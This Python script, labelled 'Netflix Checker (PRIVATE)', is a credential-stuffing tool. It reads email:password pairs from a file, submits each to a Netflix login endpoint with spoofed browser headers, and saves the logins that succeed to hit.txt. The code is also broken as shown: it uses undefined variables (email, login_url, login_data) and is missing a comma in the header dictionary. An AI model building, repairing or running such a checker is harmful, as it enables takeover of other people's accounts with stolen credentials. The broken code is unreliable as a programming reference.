import requests
import time
import os
import colorama  
import json
from dateutil import parser
from datetime import datetime
colorama.init()
from colorama import Fore, Back, Style

def baslat(user , password):
    try:
        url = "https://api-global.us-east-1-sa.prodaa.netflix.com/account/auth"
        payload = {
            "email": email,
            "password": password,
            "setCookies": "true"
        }
        headers = {
            "Host": "api-global.us-east-1-sa.prodaa.netflix.com",
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0",
            "DNT": "1",
            "Upgrade-Insecure-Requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36"
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        response = requests.post(login_url, data=login_data, headers=headers)
        response_text = response.text
        if any(key in response_text for key in ["\"mode\":\"memberHome\"", "CURRENT_MEMBER"]):
            print(Fore.GREEN + "[HIT] " + Fore.BLUE + user + ":" + password + Fore.RESET)
            open("hit.txt", "a").write(user + ":" + password + "\n")
        else:
            print(f"{Fore.RED}[FAIL] {Fore.BLUE}{user}:{password}{Fore.RESET}")

        return True
    except Exception as e:
        print(f"{Fore.RED}[FAIL] {Fore.BLUE}{user}:{password}{Fore.RESET}")

print("Netflix Checker (PRIVATE)")
time.sleep(1)
accounts = open("accounts.txt", "r")
for line in accounts:
    line = line.strip()
    user = line.split(":")[0]
    password = line.split(":")[1]
    baslat(user, password)